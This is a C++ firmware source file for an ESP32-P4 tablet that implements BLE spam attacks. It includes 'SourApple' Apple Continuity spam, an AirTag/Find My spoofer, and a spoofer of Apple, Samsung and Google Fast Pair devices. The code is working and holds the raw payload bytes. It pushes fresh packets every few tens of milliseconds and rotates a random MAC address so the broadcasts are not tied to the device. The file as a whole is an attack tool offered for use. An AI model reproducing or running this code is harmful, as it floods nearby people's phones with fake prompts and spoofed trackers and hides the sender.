// -----------------------------------------------------------------------------
// tab5_ble_adv.cpp — BLE advertising features for the M5Stack Tab5 (ESP32-P4)
// via the IDF NimBLE C API: BleSpoofer, SourApple, AirTagSpoofer.
//
// NimBLE-Arduino does not build on P4, so these are reimplemented against the
// framework's IDF NimBLE. The host is shared with the scanner (tab5_ble.h) and
// brought up once (hostedInitBLE + nimble_port_init). Payload bytes are copied
// verbatim from the original bluetooth.cpp. Unlike the originals (whose MAC
// rotation was dead code), we actually rotate a random static address per push
// via ble_hs_id_set_rnd so we don't advertise from the Tab5's real identity.
//
// Rotation must stop advertising first: ble_gap_adv_set_data / ble_hs_id_set_rnd
// return BLE_HS_EBUSY while an advertisement is live.
// -----------------------------------------------------------------------------
#if defined(BOARD_TAB5)

#include "config.h"
#include "shared.h"
#include "SettingsStore.h"
#include "Touchscreen.h"
#include "utils.h"
#include "tab5_ble.h"

#include <string.h>
#include <stdarg.h>
#include <esp_random.h>

extern "C" {
#include "host/ble_hs.h"
#include "host/ble_gap.h"
#include "host/ble_hs_id.h"
#include "nimble/ble.h"
}

extern TFT_eSPI tft;

// ---- shared advertising helpers (file scope) ----
static void advStop() {
  if (ble_gap_adv_active()) ble_gap_adv_stop();
}

// Stop (if live), rotate to a fresh random static address, set the raw payload,
// and start non-... connectable-undirected advertising at 20 ms (matches the
// originals' NimBLE-Arduino defaults). Returns 0 on success.
static int advPush(const uint8_t* data, int len) {
  if (ble_gap_adv_active()) ble_gap_adv_stop();
  uint8_t addr[6];
  esp_fill_random(addr, sizeof(addr));
  addr[5] |= 0xC0;                       // static-random: top two bits set (MSB is addr[5] in the LE C API)
  ble_hs_id_set_rnd(addr);
  int rc = ble_gap_adv_set_data(data, len);
  if (rc != 0) return rc;
  struct ble_gap_adv_params ap;
  memset(&ap, 0, sizeof(ap));
  ap.conn_mode = BLE_GAP_CONN_MODE_UND;
  ap.disc_mode = BLE_GAP_DISC_MODE_GEN;
  ap.itvl_min = 0x20;                    // 20 ms
  ap.itvl_max = 0x20;
  return ble_gap_adv_start(BLE_OWN_ADDR_RANDOM, NULL, BLE_HS_FOREVER, &ap, NULL, NULL);
}

static void advScreen(const char* title, const char* line2) {
  tft.fillScreen(TFT_BLACK);
  drawStatusBar(currentBatteryVoltage, true);
  tft.setTextFont(1);
  tft.setTextDatum(TL_DATUM);
  tft.setTextColor(GREEN, TFT_BLACK);
  tft.setCursor(6, 44);
  tft.print(title);
  if (line2) {
    tft.setTextColor(WHITE, TFT_BLACK);
    tft.setCursor(6, 64);
    tft.print(line2);
  }
}

static void advStatusLine(const char* fmt, ...) {
  char buf[64];
  va_list ap; va_start(ap, fmt); vsnprintf(buf, sizeof(buf), fmt, ap); va_end(ap);
  tft.setTextFont(1);
  tft.setTextDatum(TL_DATUM);
  tft.fillRect(6, 84, TFT_WIDTH - 12, 12, TFT_BLACK);
  tft.setTextColor(WHITE, TFT_BLACK);
  tft.setCursor(6, 84);
  tft.print(buf);
}

// ---- payload builders (bytes verbatim from bluetooth.cpp) ----
static void buildSourApple(uint8_t p[17]) {
  static const uint8_t types[] = {0x27, 0x09, 0x02, 0x1e, 0x2b, 0x2d, 0x2f, 0x01, 0x06, 0x20, 0xc0};
  int i = 0;
  p[i++] = 16; p[i++] = 0xFF; p[i++] = 0x4C; p[i++] = 0x00;
  p[i++] = 0x0F; p[i++] = 0x05; p[i++] = 0xC1;
  p[i++] = types[esp_random() % (sizeof(types))];
  esp_fill_random(&p[i], 3); i += 3;
  p[i++] = 0x00; p[i++] = 0x00; p[i++] = 0x10;
  esp_fill_random(&p[i], 3);
}

static const uint16_t kAirTagModels[] = {0x0055, 0x0030};
static void buildAirTag(uint8_t p[31], int modelIdx) {
  uint16_t model = kAirTagModels[modelIdx & 1];
  int i = 0;
  p[i++] = 0x1e; p[i++] = 0xff; p[i++] = 0x4c; p[i++] = 0x00;
  p[i++] = 0x07; p[i++] = 0x19; p[i++] = 0x05;
  p[i++] = (uint8_t)((model >> 8) & 0xFF); p[i++] = (uint8_t)(model & 0xFF);
  p[i++] = 0x55;
  p[i++] = (uint8_t)(((esp_random() % 10) << 4) | (esp_random() % 10));
  p[i++] = (uint8_t)(((esp_random() % 8) << 4) | (esp_random() % 10));
  p[i++] = (uint8_t)(esp_random() % 256);
  p[i++] = 0x00; p[i++] = 0x00;
  esp_fill_random(&p[i], 16); i += 16;
  while (i < 31) p[i++] = 0x00;
}

// Spoofer devices: 0..16 Apple, 17..19 Samsung, 20 Google.
static const uint8_t kAppleModels[] = {0x02, 0x0e, 0x0a, 0x0f, 0x13, 0x14, 0x03, 0x0b, 0x0c,
                                       0x11, 0x10, 0x05, 0x06, 0x09, 0x17, 0x12, 0x16};
static const char* const kAppleNames[] = {
    "AirPods", "AirPods Pro", "AirPods Max", "AirPods 2", "AirPods 3", "AirPods Pro 2",
    "PowerBeats", "PowerBeats Pro", "Beats Solo Pro", "Beats Studio Buds", "Beats Flex",
    "BeatsX", "Beats Solo3", "Beats Studio3", "Beats Studio Pro", "Beats Fit Pro",
    "Beats Studio Buds+"};
static const uint8_t kSamsungModels[] = {0x01, 0x02, 0x03};
static const char* const kSamsungNames[] = {"Galaxy Watch4", "Galaxy Watch5", "Galaxy Watch6"};
static const int kSpoofCount = 17 + 3 + 1;   // 21

static int buildSpoofer(uint8_t p[31], int idx, const char** nameOut) {
  if (idx < 17) {
    static const uint8_t tmpl[31] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x00, 0x20, 0x75,
                                     0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00,
                                     0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
    memcpy(p, tmpl, 31);
    p[7] = kAppleModels[idx];
    if (nameOut) *nameOut = kAppleNames[idx];
    return 31;
  } else if (idx < 20) {
    const int s = idx - 17;
    static const uint8_t tmpl[15] = {0x0E, 0xFF, 0x75, 0x00, 0x01, 0x00, 0x02, 0x00,
                                     0x01, 0x01, 0xFF, 0x00, 0x00, 0x43, 0x00};
    memcpy(p, tmpl, 15);
    p[14] = kSamsungModels[s];
    if (nameOut) *nameOut = kSamsungNames[s];
    return 15;
  } else {
    static const uint8_t tmpl[14] = {0x03, 0x03, 0x2C, 0xFE, 0x06, 0x16, 0x2C, 0xFE,
                                     0x00, 0xB7, 0x27, 0x02, 0x0A, 0x00};
    memcpy(p, tmpl, 14);
    p[13] = (uint8_t)((int)(esp_random() % 121) - 100);   // TX power level, randomized
    if (nameOut) *nameOut = "Google Fast Pair";
    return 14;
  }
}

// =============================== SourApple ===============================
namespace SourApple {
static uint32_t s_last = 0, s_lastUi = 0, s_tx = 0;

void sourappleSetup() {
  pauseBackgroundRadioTasks();
  setTouchButtonInputEnabled(true);
  setTouchNavLabels(nullptr, nullptr, "Exit", nullptr, nullptr);
  const bool ok = tab5BleEnsureHost();
  advScreen("SourApple - Apple BLE spam", ok ? "Spamming Apple Continuity..." : "BLE bring-up failed (C6)");
  redrawTouchButtonBar();
  s_last = 0; s_lastUi = 0; s_tx = 0;
}

void sourappleLoop() {
  if (feature_active && isButtonPressed(BTN_SELECT)) { feature_exit_requested = true; return; }
  if (tab5BleSynced()) {
    const uint32_t now = millis();
    if (now - s_last >= 40) {                    // continuous churn: fresh payload + MAC each cycle
      uint8_t pkt[17];
      buildSourApple(pkt);
      if (advPush(pkt, sizeof(pkt)) == 0) s_tx++;
      s_last = now;
    }
    if (now - s_lastUi >= 500) { advStatusLine("Ads sent: %lu", (unsigned long)s_tx); s_lastUi = now; }
  }
  updateStatusBar();
  delay(5);
}

void exit() { advStop(); }
}  // namespace SourApple

// ============================= AirTagSpoofer =============================
namespace AirTagSpoofer {
static uint32_t s_last = 0, s_lastUi = 0, s_tx = 0;
static int s_model = 0;

void airTagSetup() {
  pauseBackgroundRadioTasks();
  setTouchButtonInputEnabled(true);
  setTouchNavLabels("Model", nullptr, "Exit", nullptr, nullptr);
  const bool ok = tab5BleEnsureHost();
  advScreen("AirTag Spoofer (Find My)", ok ? "Broadcasting AirTag setup..." : "BLE bring-up failed (C6)");
  redrawTouchButtonBar();
  s_last = 0; s_lastUi = 0; s_tx = 0; s_model = 0;
}

void airTagLoop() {
  if (feature_active && isButtonPressed(BTN_SELECT)) { feature_exit_requested = true; return; }
  if (isButtonPressedEdge(BTN_LEFT)) { s_model = (s_model + 1) % 2; s_lastUi = 0; }
  if (tab5BleSynced()) {
    const uint32_t now = millis();
    if (now - s_last >= 120) {
      uint8_t pkt[31];
      buildAirTag(pkt, s_model);
      if (advPush(pkt, 31) == 0) s_tx++;
      s_last = now;
    }
    if (now - s_lastUi >= 500) {
      advStatusLine("Model: %s   Ads: %lu", s_model ? "AirTag Alt" : "AirTag", (unsigned long)s_tx);
      s_lastUi = now;
    }
  }
  updateStatusBar();
  delay(5);
}

void exit() { advStop(); }
}  // namespace AirTagSpoofer

// ============================== BleSpoofer ==============================
namespace BleSpoofer {
static uint32_t s_last = 0, s_lastUi = 0, s_tx = 0;
static int s_dev = 0;
static const char* s_name = "";

void spooferSetup() {
  pauseBackgroundRadioTasks();
  setTouchButtonInputEnabled(true);
  setTouchNavLabels("Prev", nullptr, "Exit", nullptr, "Next");
  const bool ok = tab5BleEnsureHost();
  advScreen("BLE Spoofer (device spam)", ok ? "Broadcasting fake device..." : "BLE bring-up failed (C6)");
  redrawTouchButtonBar();
  s_last = 0; s_lastUi = 0; s_tx = 0; s_dev = 0; s_name = "";
}

void spooferLoop() {
  if (feature_active && isButtonPressed(BTN_SELECT)) { feature_exit_requested = true; return; }
  bool devChanged = false;
  if (isButtonPressedEdge(BTN_RIGHT)) { s_dev = (s_dev + 1) % kSpoofCount; devChanged = true; }
  if (isButtonPressedEdge(BTN_LEFT))  { s_dev = (s_dev + kSpoofCount - 1) % kSpoofCount; devChanged = true; }

  if (tab5BleSynced()) {
    const uint32_t now = millis();
    if (devChanged || now - s_last >= 500) {     // re-advertise (rotate MAC) on change + periodically
      uint8_t pkt[31];
      const int len = buildSpoofer(pkt, s_dev, &s_name);
      if (advPush(pkt, len) == 0) s_tx++;
      s_last = now;
    }
  }
  if (devChanged || millis() - s_lastUi >= 500) {
    advStatusLine("[%d/%d] %s", s_dev + 1, kSpoofCount, s_name ? s_name : "");
    s_lastUi = millis();
  }
  updateStatusBar();
  delay(5);
}

void exit() { advStop(); }
}  // namespace BleSpoofer

#endif  // BOARD_TAB5
